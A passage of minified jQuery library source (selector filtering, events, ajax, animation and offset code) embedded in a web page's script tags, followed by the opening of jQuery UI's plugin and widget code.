i=0;p[i];i++){m=p[i].exec(t);if(m){t=t.substring(m[0].length);m[2]=m[2].replace(/\\/g,"");break;}}if(!m)break;if(m[1]==":"&&m[2]=="not")r=isSimple.test(m[3])?jQuery.filter(m[3],r,true).r:jQuery(r).not(m[3]);else if(m[1]==".")r=jQuery.classFilter(r,m[2],not);else if(m[1]=="["){var tmp=[],type=m[3];for(var i=0,rl=r.length;i<rl;i++){var a=r[i],z=a[jQuery.props[m[2]]||m[2]];if(z==null||/href|src|selected/.test(m[2]))z=jQuery.attr(a,m[2])||'';if((type==""&&!!z||type=="="&&z==m[5]||type=="!="&&z!=m[5]||type=="^="&&z&&!z.indexOf(m[5])||type=="$="&&z.substr(z.length-m[5].length)==m[5]||(type=="*="||type=="~=")&&z.indexOf(m[5])>=0)^not)tmp.push(a);}r=tmp;}else if(m[1]==":"&&m[2]=="nth-child"){var merge={},tmp=[],test=/(-?)(\d*)n((?:\+|-)?\d*)/.exec(m[3]=="even"&&"2n"||m[3]=="odd"&&"2n+1"||!/\D/.test(m[3])&&"0n+"+m[3]||m[3]),first=(test[1]+(test[2]||1))-0,last=test[3]-0;for(var i=0,rl=r.length;i<rl;i++){var node=r[i],parentNode=node.parentNode,id=jQuery.data(parentNode);if(!merge[id]){var c=1;for(var n=parentNode.firstChild;n;n=n.nextSibling)if(n.nodeType==1)n.nodeIndex=c++;merge[id]=true;}var add=false;if(first==0){if(node.nodeIndex==last)add=true;}else if((node.nodeIndex-last)%first==0&&(node.nodeIndex-last)/first>=0)add=true;if(add^not)tmp.push(node);}r=tmp;}else{var fn=jQuery.expr[m[1]];if(typeof fn=="object")fn=fn[m[2]];if(typeof fn=="string")fn=eval("false||function(a,i){return "+fn+";}");r=jQuery.grep(r,function(elem,i){return fn(elem,i,m,r);},not);}}return{r:r,t:t};},dir:function(elem,dir){var matched=[],cur=elem[dir];while(cur&&cur!=document){if(cur.nodeType==1)matched.push(cur);cur=cur[dir];}return matched;},nth:function(cur,result,dir,elem){result=result||1;var num=0;for(;cur;cur=cur[dir])if(cur.nodeType==1&&++num==result)break;return cur;},sibling:function(n,elem){var r=[];for(;n;n=n.nextSibling){if(n.nodeType==1&&n!=elem)r.push(n);}return r;}});jQuery.event={add:function(elem,types,handler,data){if(elem.nodeType==3||elem.nodeType==8)return;if(jQuery.browser.msie&&elem.setInterval)elem=window;if(!handler.guid)handler.guid=this.guid++;if(data!=undefined){var fn=handler;handler=this.proxy(fn,function(){return fn.apply(this,arguments);});handler.data=data;}var events=jQuery.data(elem,"events")||jQuery.data(elem,"events",{}),handle=jQuery.data(elem,"handle")||jQuery.data(elem,"handle",function(){if(typeof jQuery!="undefined"&&!jQuery.event.triggered)return jQuery.event.handle.apply(arguments.callee.elem,arguments);});handle.elem=elem;jQuery.each(types.split(/\s+/),function(index,type){var parts=type.split(".");type=parts[0];handler.type=parts[1];var handlers=events[type];if(!handlers){handlers=events[type]={};if(!jQuery.event.special[type]||jQuery.event.special[type].setup.call(elem)===false){if(elem.addEventListener)elem.addEventListener(type,handle,false);else if(elem.attachEvent)elem.attachEvent("on"+type,handle);}}handlers[handler.guid]=handler;jQuery.event.global[type]=true;});elem=null;},guid:1,global:{},remove:function(elem,types,handler){if(elem.nodeType==3||elem.nodeType==8)return;var events=jQuery.data(elem,"events"),ret,index;if(events){if(types==undefined||(typeof types=="string"&&types.charAt(0)=="."))for(var type in events)this.remove(elem,type+(types||""));else{if(types.type){handler=types.handler;types=types.type;}jQuery.each(types.split(/\s+/),function(index,type){var parts=type.split(".");type=parts[0];if(events[type]){if(handler)delete events[type][handler.guid];else
for(handler in events[type])if(!parts[1]||events[type][handler].type==parts[1])delete events[type][handler];for(ret in events[type])break;if(!ret){if(!jQuery.event.special[type]||jQuery.event.special[type].teardown.call(elem)===false){if(elem.removeEventListener)elem.removeEventListener(type,jQuery.data(elem,"handle"),false);else if(elem.detachEvent)elem.detachEvent("on"+type,jQuery.data(elem,"handle"));}ret=null;delete events[type];}}});}for(ret in events)break;if(!ret){var handle=jQuery.data(elem,"handle");if(handle)handle.elem=null;jQuery.removeData(elem,"events");jQuery.removeData(elem,"handle");}}},trigger:function(type,data,elem,donative,extra){data=jQuery.makeArray(data);if(type.indexOf("!")>=0){type=type.slice(0,-1);var exclusive=true;}if(!elem){if(this.global[type])jQuery("*").add([window,document]).trigger(type,data);}else{if(elem.nodeType==3||elem.nodeType==8)return undefined;var val,ret,fn=jQuery.isFunction(elem[type]||null),event=!data[0]||!data[0].preventDefault;if(event){data.unshift({type:type,target:elem,preventDefault:function(){},stopPropagation:function(){},timeStamp:now()});data[0][expando]=true;}data[0].type=type;if(exclusive)data[0].exclusive=true;var handle=jQuery.data(elem,"handle");if(handle)val=handle.apply(elem,data);if((!fn||(jQuery.nodeName(elem,'a')&&type=="click"))&&elem["on"+type]&&elem["on"+type].apply(elem,data)===false)val=false;if(event)data.shift();if(extra&&jQuery.isFunction(extra)){ret=extra.apply(elem,val==null?data:data.concat(val));if(ret!==undefined)val=ret;}if(fn&&donative!==false&&val!==false&&!(jQuery.nodeName(elem,'a')&&type=="click")){this.triggered=true;try{elem[type]();}catch(e){}}this.triggered=false;}return val;},handle:function(event){var val,ret,namespace,all,handlers;event=arguments[0]=jQuery.event.fix(event||window.event);namespace=event.type.split(".");event.type=namespace[0];namespace=namespace[1];all=!namespace&&!event.exclusive;handlers=(jQuery.data(this,"events")||{})[event.type];for(var j in handlers){var handler=handlers[j];if(all||handler.type==namespace){event.handler=handler;event.data=handler.data;ret=handler.apply(this,arguments);if(val!==false)val=ret;if(ret===false){event.preventDefault();event.stopPropagation();}}}return val;},fix:function(event){if(event[expando]==true)return event;var originalEvent=event;event={originalEvent:originalEvent};var props="altKey attrChange attrName bubbles button cancelable charCode clientX clientY ctrlKey currentTarget data detail eventPhase fromElement handler keyCode metaKey newValue originalTarget pageX pageY prevValue relatedNode relatedTarget screenX screenY shiftKey srcElement target timeStamp toElement type view wheelDelta which".split(" ");for(var i=props.length;i;i--)event[props[i]]=originalEvent[props[i]];event[expando]=true;event.preventDefault=function(){if(originalEvent.preventDefault)originalEvent.preventDefault();originalEvent.returnValue=false;};event.stopPropagation=function(){if(originalEvent.stopPropagation)originalEvent.stopPropagation();originalEvent.cancelBubble=true;};event.timeStamp=event.timeStamp||now();if(!event.target)event.target=event.srcElement||document;if(event.target.nodeType==3)event.target=event.target.parentNode;if(!event.relatedTarget&&event.fromElement)event.relatedTarget=event.fromElement==event.target?event.toElement:event.fromElement;if(event.pageX==null&&event.clientX!=null){var doc=document.documentElement,body=document.body;event.pageX=event.clientX+(doc&&doc.scrollLeft||body&&body.scrollLeft||0)-(doc.clientLeft||0);event.pageY=event.clientY+(doc&&doc.scrollTop||body&&body.scrollTop||0)-(doc.clientTop||0);}if(!event.which&&((event.charCode||event.charCode===0)?event.charCode:event.keyCode))event.which=event.charCode||event.keyCode;if(!event.metaKey&&event.ctrlKey)event.metaKey=event.ctrlKey;if(!event.which&&event.button)event.which=(event.button&1?1:(event.button&2?3:(event.button&4?2:0)));return event;},proxy:function(fn,proxy){proxy.guid=fn.guid=fn.guid||proxy.guid||this.guid++;return proxy;},special:{ready:{setup:function(){bindReady();return;},teardown:function(){return;}},mouseenter:{setup:function(){if(jQuery.browser.msie)return false;jQuery(this).bind("mouseover",jQuery.event.special.mouseenter.handler);return true;},teardown:function(){if(jQuery.browser.msie)return false;jQuery(this).unbind("mouseover",jQuery.event.special.mouseenter.handler);return true;},handler:function(event){if(withinElement(event,this))return true;event.type="mouseenter";return jQuery.event.handle.apply(this,arguments);}},mouseleave:{setup:function(){if(jQuery.browser.msie)return false;jQuery(this).bind("mouseout",jQuery.event.special.mouseleave.handler);return true;},teardown:function(){if(jQuery.browser.msie)return false;jQuery(this).unbind("mouseout",jQuery.event.special.mouseleave.handler);return true;},handler:function(event){if(withinElement(event,this))return true;event.type="mouseleave";return jQuery.event.handle.apply(this,arguments);}}}};jQuery.fn.extend({bind:function(type,data,fn){return type=="unload"?this.one(type,data,fn):this.each(function(){jQuery.event.add(this,type,fn||data,fn&&data);});},one:function(type,data,fn){var one=jQuery.event.proxy(fn||data,function(event){jQuery(this).unbind(event,one);return(fn||data).apply(this,arguments);});return this.each(function(){jQuery.event.add(this,type,one,fn&&data);});},unbind:function(type,fn){return this.each(function(){jQuery.event.remove(this,type,fn);});},trigger:function(type,data,fn){return this.each(function(){jQuery.event.trigger(type,data,this,true,fn);});},triggerHandler:function(type,data,fn){return this[0]&&jQuery.event.trigger(type,data,this[0],false,fn);},toggle:function(fn){var args=arguments,i=1;while(i<args.length)jQuery.event.proxy(fn,args[i++]);return this.click(jQuery.event.proxy(fn,function(event){this.lastToggle=(this.lastToggle||0)%i;event.preventDefault();return args[this.lastToggle++].apply(this,arguments)||false;}));},hover:function(fnOver,fnOut){return this.bind('mouseenter',fnOver).bind('mouseleave',fnOut);},ready:function(fn){bindReady();if(jQuery.isReady)fn.call(document,jQuery);else
jQuery.readyList.push(function(){return fn.call(this,jQuery);});return this;}});jQuery.extend({isReady:false,readyList:[],ready:function(){if(!jQuery.isReady){jQuery.isReady=true;if(jQuery.readyList){jQuery.each(jQuery.readyList,function(){this.call(document);});jQuery.readyList=null;}jQuery(document).triggerHandler("ready");}}});var readyBound=false;function bindReady(){if(readyBound)return;readyBound=true;if(document.addEventListener&&!jQuery.browser.opera)document.addEventListener("DOMContentLoaded",jQuery.ready,false);if(jQuery.browser.msie&&window==top)(function(){if(jQuery.isReady)return;try{document.documentElement.doScroll("left");}catch(error){setTimeout(arguments.callee,0);return;}jQuery.ready();})();if(jQuery.browser.opera)document.addEventListener("DOMContentLoaded",function(){if(jQuery.isReady)return;for(var i=0;i<document.styleSheets.length;i++)if(document.styleSheets[i].disabled){setTimeout(arguments.callee,0);return;}jQuery.ready();},false);if(jQuery.browser.safari){var numStyles;(function(){if(jQuery.isReady)return;if(document.readyState!="loaded"&&document.readyState!="complete"){setTimeout(arguments.callee,0);return;}if(numStyles===undefined)numStyles=jQuery("style, link[rel=stylesheet]").length;if(document.styleSheets.length!=numStyles){setTimeout(arguments.callee,0);return;}jQuery.ready();})();}jQuery.event.add(window,"load",jQuery.ready);}jQuery.each(("blur,focus,load,resize,scroll,unload,click,dblclick,"+"mousedown,mouseup,mousemove,mouseover,mouseout,change,select,"+"submit,keydown,keypress,keyup,error").split(","),function(i,name){jQuery.fn[name]=function(fn){return fn?this.bind(name,fn):this.trigger(name);};});var withinElement=function(event,elem){var parent=event.relatedTarget;while(parent&&parent!=elem)try{parent=parent.parentNode;}catch(error){parent=elem;}return parent==elem;};jQuery(window).bind("unload",function(){jQuery("*").add(document).unbind();});jQuery.fn.extend({_load:jQuery.fn.load,load:function(url,params,callback){if(typeof url!='string')return this._load(url);var off=url.indexOf(" ");if(off>=0){var selector=url.slice(off,url.length);url=url.slice(0,off);}callback=callback||function(){};var type="GET";if(params)if(jQuery.isFunction(params)){callback=params;params=null;}else{params=jQuery.param(params);type="POST";}var self=this;jQuery.ajax({url:url,type:type,dataType:"html",data:params,complete:function(res,status){if(status=="success"||status=="notmodified")self.html(selector?jQuery("<div/>").append(res.responseText.replace(/<script(.|\s)*?\/script>/g,"")).find(selector):res.responseText);self.each(callback,[res.responseText,status,res]);}});return this;},serialize:function(){return jQuery.param(this.serializeArray());},serializeArray:function(){return this.map(function(){return jQuery.nodeName(this,"form")?jQuery.makeArray(this.elements):this;}).filter(function(){return this.name&&!this.disabled&&(this.checked||/select|textarea/i.test(this.nodeName)||/text|hidden|password/i.test(this.type));}).map(function(i,elem){var val=jQuery(this).val();return val==null?null:val.constructor==Array?jQuery.map(val,function(val,i){return{name:elem.name,value:val};}):{name:elem.name,value:val};}).get();}});jQuery.each("ajaxStart,ajaxStop,ajaxComplete,ajaxError,ajaxSuccess,ajaxSend".split(","),function(i,o){jQuery.fn[o]=function(f){return this.bind(o,f);};});var jsc=now();jQuery.extend({get:function(url,data,callback,type){if(jQuery.isFunction(data)){callback=data;data=null;}return jQuery.ajax({type:"GET",url:url,data:data,success:callback,dataType:type});},getScript:function(url,callback){return jQuery.get(url,null,callback,"script");},getJSON:function(url,data,callback){return jQuery.get(url,data,callback,"json");},post:function(url,data,callback,type){if(jQuery.isFunction(data)){callback=data;data={};}return jQuery.ajax({type:"POST",url:url,data:data,success:callback,dataType:type});},ajaxSetup:function(settings){jQuery.extend(jQuery.ajaxSettings,settings);},ajaxSettings:{url:location.href,global:true,type:"GET",timeout:0,contentType:"application/x-www-form-urlencoded",processData:true,async:true,data:null,username:null,password:null,accepts:{xml:"application/xml, text/xml",html:"text/html",script:"text/javascript, application/javascript",json:"application/json, text/javascript",text:"text/plain",_default:"*/*"}},lastModified:{},ajax:function(s){s=jQuery.extend(true,s,jQuery.extend(true,{},jQuery.ajaxSettings,s));var jsonp,jsre=/=\?(&|$)/g,status,data,type=s.type.toUpperCase();if(s.data&&s.processData&&typeof s.data!="string")s.data=jQuery.param(s.data);if(s.dataType=="jsonp"){if(type=="GET"){if(!s.url.match(jsre))s.url+=(s.url.match(/\?/)?"&":"?")+(s.jsonp||"callback")+"=?";}else if(!s.data||!s.data.match(jsre))s.data=(s.data?s.data+"&":"")+(s.jsonp||"callback")+"=?";s.dataType="json";}if(s.dataType=="json"&&(s.data&&s.data.match(jsre)||s.url.match(jsre))){jsonp="jsonp"+jsc++;if(s.data)s.data=(s.data+"").replace(jsre,"="+jsonp+"$1");s.url=s.url.replace(jsre,"="+jsonp+"$1");s.dataType="script";window[jsonp]=function(tmp){data=tmp;success();complete();window[jsonp]=undefined;try{delete window[jsonp];}catch(e){}if(head)head.removeChild(script);};}if(s.dataType=="script"&&s.cache==null)s.cache=false;if(s.cache===false&&type=="GET"){var ts=now();var ret=s.url.replace(/(\?|&)_=.*?(&|$)/,"$1_="+ts+"$2");s.url=ret+((ret==s.url)?(s.url.match(/\?/)?"&":"?")+"_="+ts:"");}if(s.data&&type=="GET"){s.url+=(s.url.match(/\?/)?"&":"?")+s.data;s.data=null;}if(s.global&&!jQuery.active++)jQuery.event.trigger("ajaxStart");var remote=/^(?:\w+:)?\/\/([^\/?#]+)/;if(s.dataType=="script"&&type=="GET"&&remote.test(s.url)&&remote.exec(s.url)[1]!=location.host){var head=document.getElementsByTagName("head")[0];var script=document.createElement("script");script.src=s.url;if(s.scriptCharset)script.charset=s.scriptCharset;if(!jsonp){var done=false;script.onload=script.onreadystatechange=function(){if(!done&&(!this.readyState||this.readyState=="loaded"||this.readyState=="complete")){done=true;success();complete();head.removeChild(script);}};}head.appendChild(script);return undefined;}var requestDone=false;var xhr=window.ActiveXObject?new ActiveXObject("Microsoft.XMLHTTP"):new XMLHttpRequest();if(s.username)xhr.open(type,s.url,s.async,s.username,s.password);else
xhr.open(type,s.url,s.async);try{if(s.data)xhr.setRequestHeader("Content-Type",s.contentType);if(s.ifModified)xhr.setRequestHeader("If-Modified-Since",jQuery.lastModified[s.url]||"Thu, 01 Jan 1970 00:00:00 GMT");xhr.setRequestHeader("X-Requested-With","XMLHttpRequest");xhr.setRequestHeader("Accept",s.dataType&&s.accepts[s.dataType]?s.accepts[s.dataType]+", */*":s.accepts._default);}catch(e){}if(s.beforeSend&&s.beforeSend(xhr,s)===false){s.global&&jQuery.active--;xhr.abort();return false;}if(s.global)jQuery.event.trigger("ajaxSend",[xhr,s]);var onreadystatechange=function(isTimeout){if(!requestDone&&xhr&&(xhr.readyState==4||isTimeout=="timeout")){requestDone=true;if(ival){clearInterval(ival);ival=null;}status=isTimeout=="timeout"&&"timeout"||!jQuery.httpSuccess(xhr)&&"error"||s.ifModified&&jQuery.httpNotModified(xhr,s.url)&&"notmodified"||"success";if(status=="success"){try{data=jQuery.httpData(xhr,s.dataType,s.dataFilter);}catch(e){status="parsererror";}}if(status=="success"){var modRes;try{modRes=xhr.getResponseHeader("Last-Modified");}catch(e){}if(s.ifModified&&modRes)jQuery.lastModified[s.url]=modRes;if(!jsonp)success();}else
jQuery.handleError(s,xhr,status);complete();if(s.async)xhr=null;}};if(s.async){var ival=setInterval(onreadystatechange,13);if(s.timeout>0)setTimeout(function(){if(xhr){xhr.abort();if(!requestDone)onreadystatechange("timeout");}},s.timeout);}try{xhr.send(s.data);}catch(e){jQuery.handleError(s,xhr,null,e);}if(!s.async)onreadystatechange();function success(){if(s.success)s.success(data,status);if(s.global)jQuery.event.trigger("ajaxSuccess",[xhr,s]);}function complete(){if(s.complete)s.complete(xhr,status);if(s.global)jQuery.event.trigger("ajaxComplete",[xhr,s]);if(s.global&&!--jQuery.active)jQuery.event.trigger("ajaxStop");}return xhr;},handleError:function(s,xhr,status,e){if(s.error)s.error(xhr,status,e);if(s.global)jQuery.event.trigger("ajaxError",[xhr,s,e]);},active:0,httpSuccess:function(xhr){try{return!xhr.status&&location.protocol=="file:"||(xhr.status>=200&&xhr.status<300)||xhr.status==304||xhr.status==1223||jQuery.browser.safari&&xhr.status==undefined;}catch(e){}return false;},httpNotModified:function(xhr,url){try{var xhrRes=xhr.getResponseHeader("Last-Modified");return xhr.status==304||xhrRes==jQuery.lastModified[url]||jQuery.browser.safari&&xhr.status==undefined;}catch(e){}return false;},httpData:function(xhr,type,filter){var ct=xhr.getResponseHeader("content-type"),xml=type=="xml"||!type&&ct&&ct.indexOf("xml")>=0,data=xml?xhr.responseXML:xhr.responseText;if(xml&&data.documentElement.tagName=="parsererror")throw"parsererror";if(filter)data=filter(data,type);if(type=="script")jQuery.globalEval(data);if(type=="json")data=eval("("+data+")");return data;},param:function(a){var s=[];if(a.constructor==Array||a.jquery)jQuery.each(a,function(){s.push(encodeURIComponent(this.name)+"="+encodeURIComponent(this.value));});else
for(var j in a)if(a[j]&&a[j].constructor==Array)jQuery.each(a[j],function(){s.push(encodeURIComponent(j)+"="+encodeURIComponent(this));});else
s.push(encodeURIComponent(j)+"="+encodeURIComponent(jQuery.isFunction(a[j])?a[j]():a[j]));return s.join("&").replace(/%20/g,"+");}});jQuery.fn.extend({show:function(speed,callback){return speed?this.animate({height:"show",width:"show",opacity:"show"},speed,callback):this.filter(":hidden").each(function(){this.style.display=this.oldblock||"";if(jQuery.css(this,"display")=="none"){var elem=jQuery("<"+this.tagName+" />").appendTo("body");this.style.display=elem.css("display");if(this.style.display=="none")this.style.display="block";elem.remove();}}).end();},hide:function(speed,callback){return speed?this.animate({height:"hide",width:"hide",opacity:"hide"},speed,callback):this.filter(":visible").each(function(){this.oldblock=this.oldblock||jQuery.css(this,"display");this.style.display="none";}).end();},_toggle:jQuery.fn.toggle,toggle:function(fn,fn2){return jQuery.isFunction(fn)&&jQuery.isFunction(fn2)?this._toggle.apply(this,arguments):fn?this.animate({height:"toggle",width:"toggle",opacity:"toggle"},fn,fn2):this.each(function(){jQuery(this)[jQuery(this).is(":hidden")?"show":"hide"]();});},slideDown:function(speed,callback){return this.animate({height:"show"},speed,callback);},slideUp:function(speed,callback){return this.animate({height:"hide"},speed,callback);},slideToggle:function(speed,callback){return this.animate({height:"toggle"},speed,callback);},fadeIn:function(speed,callback){return this.animate({opacity:"show"},speed,callback);},fadeOut:function(speed,callback){return this.animate({opacity:"hide"},speed,callback);},fadeTo:function(speed,to,callback){return this.animate({opacity:to},speed,callback);},animate:function(prop,speed,easing,callback){var optall=jQuery.speed(speed,easing,callback);return this[optall.queue===false?"each":"queue"](function(){if(this.nodeType!=1)return false;var opt=jQuery.extend({},optall),p,hidden=jQuery(this).is(":hidden"),self=this;for(p in prop){if(prop[p]=="hide"&&hidden||prop[p]=="show"&&!hidden)return opt.complete.call(this);if(p=="height"||p=="width"){opt.display=jQuery.css(this,"display");opt.overflow=this.style.overflow;}}if(opt.overflow!=null)this.style.overflow="hidden";opt.curAnim=jQuery.extend({},prop);jQuery.each(prop,function(name,val){var e=new jQuery.fx(self,opt,name);if(/toggle|show|hide/.test(val))e[val=="toggle"?hidden?"show":"hide":val](prop);else{var parts=val.toString().match(/^([+-]=)?([\d+-.]+)(.*)$/),start=e.cur(true)||0;if(parts){var end=parseFloat(parts[2]),unit=parts[3]||"px";if(unit!="px"){self.style[name]=(end||1)+unit;start=((end||1)/e.cur(true))*start;self.style[name]=start+unit;}if(parts[1])end=((parts[1]=="-="?-1:1)*end)+start;e.custom(start,end,unit);}else
e.custom(start,val,"");}});return true;});},queue:function(type,fn){if(jQuery.isFunction(type)||(type&&type.constructor==Array)){fn=type;type="fx";}if(!type||(typeof type=="string"&&!fn))return queue(this[0],type);return this.each(function(){if(fn.constructor==Array)queue(this,type,fn);else{queue(this,type).push(fn);if(queue(this,type).length==1)fn.call(this);}});},stop:function(clearQueue,gotoEnd){var timers=jQuery.timers;if(clearQueue)this.queue([]);this.each(function(){for(var i=timers.length-1;i>=0;i--)if(timers[i].elem==this){if(gotoEnd)timers[i](true);timers.splice(i,1);}});if(!gotoEnd)this.dequeue();return this;}});var queue=function(elem,type,array){if(elem){type=type||"fx";var q=jQuery.data(elem,type+"queue");if(!q||array)q=jQuery.data(elem,type+"queue",jQuery.makeArray(array));}return q;};jQuery.fn.dequeue=function(type){type=type||"fx";return this.each(function(){var q=queue(this,type);q.shift();if(q.length)q[0].call(this);});};jQuery.extend({speed:function(speed,easing,fn){var opt=speed&&speed.constructor==Object?speed:{complete:fn||!fn&&easing||jQuery.isFunction(speed)&&speed,duration:speed,easing:fn&&easing||easing&&easing.constructor!=Function&&easing};opt.duration=(opt.duration&&opt.duration.constructor==Number?opt.duration:jQuery.fx.speeds[opt.duration])||jQuery.fx.speeds.def;opt.old=opt.complete;opt.complete=function(){if(opt.queue!==false)jQuery(this).dequeue();if(jQuery.isFunction(opt.old))opt.old.call(this);};return opt;},easing:{linear:function(p,n,firstNum,diff){return firstNum+diff*p;},swing:function(p,n,firstNum,diff){return((-Math.cos(p*Math.PI)/2)+0.5)*diff+firstNum;}},timers:[],timerId:null,fx:function(elem,options,prop){this.options=options;this.elem=elem;this.prop=prop;if(!options.orig)options.orig={};}});jQuery.fx.prototype={update:function(){if(this.options.step)this.options.step.call(this.elem,this.now,this);(jQuery.fx.step[this.prop]||jQuery.fx.step._default)(this);if(this.prop=="height"||this.prop=="width")this.elem.style.display="block";},cur:function(force){if(this.elem[this.prop]!=null&&this.elem.style[this.prop]==null)return this.elem[this.prop];var r=parseFloat(jQuery.css(this.elem,this.prop,force));return r&&r>-10000?r:parseFloat(jQuery.curCSS(this.elem,this.prop))||0;},custom:function(from,to,unit){this.startTime=now();this.start=from;this.end=to;this.unit=unit||this.unit||"px";this.now=this.start;this.pos=this.state=0;this.update();var self=this;function t(gotoEnd){return self.step(gotoEnd);}t.elem=this.elem;jQuery.timers.push(t);if(jQuery.timerId==null){jQuery.timerId=setInterval(function(){var timers=jQuery.timers;for(var i=0;i<timers.length;i++)if(!timers[i]())timers.splice(i--,1);if(!timers.length){clearInterval(jQuery.timerId);jQuery.timerId=null;}},13);}},show:function(){this.options.orig[this.prop]=jQuery.attr(this.elem.style,this.prop);this.options.show=true;this.custom(0,this.cur());if(this.prop=="width"||this.prop=="height")this.elem.style[this.prop]="1px";jQuery(this.elem).show();},hide:function(){this.options.orig[this.prop]=jQuery.attr(this.elem.style,this.prop);this.options.hide=true;this.custom(this.cur(),0);},step:function(gotoEnd){var t=now();if(gotoEnd||t>this.options.duration+this.startTime){this.now=this.end;this.pos=this.state=1;this.update();this.options.curAnim[this.prop]=true;var done=true;for(var i in this.options.curAnim)if(this.options.curAnim[i]!==true)done=false;if(done){if(this.options.display!=null){this.elem.style.overflow=this.options.overflow;this.elem.style.display=this.options.display;if(jQuery.css(this.elem,"display")=="none")this.elem.style.display="block";}if(this.options.hide)this.elem.style.display="none";if(this.options.hide||this.options.show)for(var p in this.options.curAnim)jQuery.attr(this.elem.style,p,this.options.orig[p]);}if(done)this.options.complete.call(this.elem);return false;}else{var n=t-this.startTime;this.state=n/this.options.duration;this.pos=jQuery.easing[this.options.easing||(jQuery.easing.swing?"swing":"linear")](this.state,n,0,1,this.options.duration);this.now=this.start+((this.end-this.start)*this.pos);this.update();}return true;}};jQuery.extend(jQuery.fx,{speeds:{slow:600,fast:200,def:400},step:{scrollLeft:function(fx){fx.elem.scrollLeft=fx.now;},scrollTop:function(fx){fx.elem.scrollTop=fx.now;},opacity:function(fx){jQuery.attr(fx.elem.style,"opacity",fx.now);},_default:function(fx){fx.elem.style[fx.prop]=fx.now+fx.unit;}}});jQuery.fn.offset=function(){var left=0,top=0,elem=this[0],results;if(elem)with(jQuery.browser){var parent=elem.parentNode,offsetChild=elem,offsetParent=elem.offsetParent,doc=elem.ownerDocument,safari2=safari&&parseInt(version)<522&&!/adobeair/i.test(userAgent),css=jQuery.curCSS,fixed=css(elem,"position")=="fixed";if(elem.getBoundingClientRect){var box=elem.getBoundingClientRect();add(box.left+Math.max(doc.documentElement.scrollLeft,doc.body.scrollLeft),box.top+Math.max(doc.documentElement.scrollTop,doc.body.scrollTop));add(-doc.documentElement.clientLeft,-doc.documentElement.clientTop);}else{add(elem.offsetLeft,elem.offsetTop);while(offsetParent){add(offsetParent.offsetLeft,offsetParent.offsetTop);if(mozilla&&!/^t(able|d|h)$/i.test(offsetParent.tagName)||safari&&!safari2)border(offsetParent);if(!fixed&&css(offsetParent,"position")=="fixed")fixed=true;offsetChild=/^body$/i.test(offsetParent.tagName)?offsetChild:offsetParent;offsetParent=offsetParent.offsetParent;}while(parent&&parent.tagName&&!/^body|html$/i.test(parent.tagName)){if(!/^inline|table.*$/i.test(css(parent,"display")))add(-parent.scrollLeft,-parent.scrollTop);if(mozilla&&css(parent,"overflow")!="visible")border(parent);parent=parent.parentNode;}if((safari2&&(fixed||css(offsetChild,"position")=="absolute"))||(mozilla&&css(offsetChild,"position")!="absolute"))add(-doc.body.offsetLeft,-doc.body.offsetTop);if(fixed)add(Math.max(doc.documentElement.scrollLeft,doc.body.scrollLeft),Math.max(doc.documentElement.scrollTop,doc.body.scrollTop));}results={top:top,left:left};}function border(elem){add(jQuery.curCSS(elem,"borderLeftWidth",true),jQuery.curCSS(elem,"borderTopWidth",true));}function add(l,t){left+=parseInt(l,10)||0;top+=parseInt(t,10)||0;}return results;};jQuery.fn.extend({position:function(){var left=0,top=0,results;if(this[0]){var offsetParent=this.offsetParent(),offset=this.offset(),parentOffset=/^body|html$/i.test(offsetParent[0].tagName)?{top:0,left:0}:offsetParent.offset();offset.top-=num(this,'marginTop');offset.left-=num(this,'marginLeft');parentOffset.top+=num(offsetParent,'borderTopWidth');parentOffset.left+=num(offsetParent,'borderLeftWidth');results={top:offset.top-parentOffset.top,left:offset.left-parentOffset.left};}return results;},offsetParent:function(){var offsetParent=this[0].offsetParent;while(offsetParent&&(!/^body|html$/i.test(offsetParent.tagName)&&jQuery.css(offsetParent,'position')=='static'))offsetParent=offsetParent.offsetParent;return jQuery(offsetParent);}});jQuery.each(['Left','Top'],function(i,name){var method='scroll'+name;jQuery.fn[method]=function(val){if(!this[0])return;return val!=undefined?this.each(function(){this==window||this==document?window.scrollTo(!i?val:jQuery(window).scrollLeft(),i?val:jQuery(window).scrollTop()):this[method]=val;}):this[0]==window||this[0]==document?self[i?'pageYOffset':'pageXOffset']||jQuery.boxModel&&document.documentElement[method]||document.body[method]:this[0][method];};});jQuery.each(["Height","Width"],function(i,name){var tl=i?"Left":"Top",br=i?"Right":"Bottom";jQuery.fn["inner"+name]=function(){return this[name.toLowerCase()]()+num(this,"padding"+tl)+num(this,"padding"+br);};jQuery.fn["outer"+name]=function(margin){return this["inner"+name]()+num(this,"border"+tl+"Width")+num(this,"border"+br+"Width")+(margin?num(this,"margin"+tl)+num(this,"margin"+br):0);};});})();</script>
    <script type="text/javascript">;(function($){$.ui={plugin:{add:function(module,option,set){var proto=$.ui[module].prototype;for(var i in set){proto.plugins[i]=proto.plugins[i]||[];proto.plugins[i].push([option,set[i]]);}},call:function(instance,name,args){var set=instance.plugins[name];if(!set){return;}
for(var i=0;i<set.length;i++){if(instance.options[set[i][0]]){set[i][1].apply(instance.element,args);}}}},cssCache:{},css:function(name){if($.ui.cssCache[name]){return $.ui.cssCache[name];}
var tmp=$('<div class="ui-gen">').addClass(name).css({position:'absolute',top:'-5000px',left:'-5000px',display:'block'}).appendTo('body');$.ui.cssCache[name]=!!((!(/auto|default/).test(tmp.css('cursor'))||(/^[1-9]/).test(tmp.css('height'))||(/^[1-9]/).test(tmp.css('width'))||!(/none/).test(tmp.css('backgroundImage'))||!(/transparent|rgba\(0, 0, 0, 0\)/).test(tmp.css('backgroundColor'))));try{$('body').get(0).removeChild(tmp.get(0));}catch(e){}
return $.ui.cssCache[name];},disableSelection:function(el){$(el).attr('unselectable','on').css('MozUserSelect','none');},enableSelection:function(el){$(el).attr('unselectable','off').css('MozUserSelect','');},hasScroll:function(e,a){var scroll=/top/.test(a||"top")?'scrollTop':'scrollLeft',has=false;if(e[scroll]>0)return true;e[scroll]=1;has=e[scroll]>0?true:false;e[scroll]=0;return has;}};var _remove=$.fn.remove;$.fn.remove=function(){$("*",this).add(this).triggerHandler("remove");return _remove.apply(this,arguments);};function getter(namespace,plugin,method){var methods=$[namespace][plugin].getter||[];methods=(typeof methods=="string"?methods.split(/,?\s+/):methods);return($.inArray(method,methods)!=-1);}
$.widget=function(name,prototype){var namespace=name.split(".")[0];name=name.split(".")[1];$.fn[name]=function(options){var isMethodCall=(typeof options=='string'),args=Array.prototype.slice.call(arguments,1);if(isMethodCall&&getter(namespace,name,options)){var instance=$.data(this[0],name);return(instance?instance[options].apply(instance,args):undefined);}
